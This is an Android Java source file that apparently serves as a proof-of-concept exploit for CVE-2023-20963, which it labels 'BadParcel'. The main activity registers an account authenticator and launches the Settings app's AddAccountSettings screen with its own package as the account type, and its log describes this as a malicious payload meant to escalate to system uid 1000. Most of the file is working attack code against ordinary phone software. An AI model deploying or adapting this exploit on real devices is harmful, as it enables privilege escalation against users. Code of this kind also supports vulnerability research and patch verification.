package com.example.tzpoc;

import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final String TAG = "BadParcel";
    private static StringBuilder logBuilder = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        appendLog("[*] BadParcel + SecureUI PoC started.");
        appendLog("[*] Attempting to escalate to uid=1000 via CVE-2023-20963...");

        // 1. 先触发 addAccount 以注册 Authenticator
        try {
            AccountManager am = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
            am.addAccount("com.example.tzpoc", null, null, null, this, null, null);
            appendLog("[+] addAccount triggered (may already exist).");
        } catch (Exception e) {
            appendLog("[+] addAccount triggered: " + e.getMessage());
        }

        // 2. 启动 Settings 的 AddAccountSettings，传递我们的 account_type
        Intent attacker = new Intent();
        attacker.setComponent(new ComponentName(
                "com.android.settings",
                "com.android.settings.accounts.AddAccountSettings"
        ));
        attacker.setAction(Intent.ACTION_RUN);
        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String[] authTypes = {getPackageName()};
        attacker.putExtra("account_types", authTypes);
        startActivity(attacker);
        appendLog("[+] AddAccountSettings launched with malicious payload.");

        // 3. 延迟退出，等待 ProofActivity 被启动
        new Handler().postDelayed(() -> {
            appendLog("[*] PoC finished. Check logcat and /sdcard/Download/ for proof.");
            saveLog();
            finish();
        }, 10000);
    }

    // ログ蓄積
    public static void appendLog(String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        Log.d(TAG, msg);
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) return;
            File file = new File(dir, "badparcel_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file)))) {
                pw.print(logBuilder.toString());
            }
            appendLog("[+] Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Save log failed: " + e.getMessage());
        }
    }
}
